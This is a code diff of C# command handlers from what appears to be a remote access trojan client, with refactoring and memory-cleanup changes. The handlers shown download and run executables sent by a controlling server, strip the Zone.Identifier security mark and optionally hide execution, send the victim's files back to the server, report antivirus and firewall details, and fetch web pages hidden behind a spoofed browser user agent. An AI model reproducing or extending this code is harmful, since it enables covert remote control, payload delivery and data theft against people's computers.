@@ -92,15 +92,14 @@ namespace Core.Commands
 		{
 			new Thread(new ThreadStart(() =>
 			{
-				byte[] fileBytes = command.FileBytes;
 				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
 
 				try
 				{
-					if (fileBytes[0] != 'M' && fileBytes[1] != 'Z')
+                    if (command.FileBytes[0] != 'M' && command.FileBytes[1] != 'Z')
 						throw new Exception("no pe file");
 
-					File.WriteAllBytes(tempFile, fileBytes);
+                    File.WriteAllBytes(tempFile, command.FileBytes);
 
 					DeleteFile(tempFile + ":Zone.Identifier");
 
@@ -113,10 +112,13 @@ namespace Core.Commands
 					startInfo.UseShellExecute = command.RunHidden;
 					startInfo.FileName = tempFile;
 					Process.Start(startInfo);
+
+                    command = null;
 				}
 				catch
 				{
 					DeleteFile(tempFile);
+                    command = null;
 					new Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
 					return;
 				}
@@ -320,11 +322,11 @@ namespace Core.Commands
 		{
 			try
 			{
-				byte[] bytes = File.ReadAllBytes(command.RemotePath);
-				new Core.Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes, command.ID).Execute(client);
+                new Core.Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), File.ReadAllBytes(command.RemotePath), command.ID).Execute(client);
+                command = null;
 			}
 			catch
-			{ }
+            { command = null; }
 		}
 
 		public static void HandleMouseClick(Core.Packets.ServerPackets.MouseClick command, Core.Client client)
@@ -378,28 +380,33 @@ namespace Core.Commands
 				infoCollection[17] = SystemCore.GetAntivirus();
 				infoCollection[18] = "Firewall";
 				infoCollection[19] = SystemCore.GetFirewall();
+
+                command = null;
+                infoCollection = null;
+
 				new Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
+
 			}
 			catch
-			{ }
+            {
+                command = null;
+            }
 		}
 
 		public static void HandleVisitWebsite(Core.Packets.ServerPackets.VisitWebsite command, Core.Client client)
 		{
-			string url = command.URL;
+            if (!command.URL.StartsWith("http"))
+                command.URL = "http://" + command.URL;
 
-			if (!url.StartsWith("http"))
-				url = "http://" + url;
-
-			if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
+            if (Uri.IsWellFormedUriString(command.URL, UriKind.RelativeOrAbsolute))
 			{
 				if (!command.Hidden)
-					Process.Start(url);
+                    Process.Start(command.URL);
 				else
 				{
 					try
 					{
-						HttpWebRequest Request = (HttpWebRequest)HttpWebRequest.Create(url);
+                        HttpWebRequest Request = (HttpWebRequest)HttpWebRequest.Create(command.URL);
 						Request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
 						Request.AllowAutoRedirect = true;
 						Request.Timeout = 10000;
@@ -410,9 +417,10 @@ namespace Core.Commands
 						reader.Close();
 						DataStream.Close();
 						Response.Close();
+                        command = null;
 					}
 					catch
-					{ }
+                    { command = null; }
 				}
 
 				new Core.Packets.ClientPackets.Status("Visited Website").Execute(client);
@@ -423,6 +431,7 @@ namespace Core.Commands
 		{
 			MessageBox.Show(null, command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
 			new Core.Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
+            command = null;
 		}
 
 		public static void HandleUpdate(Core.Packets.ServerPackets.Update command, Core.Client client)
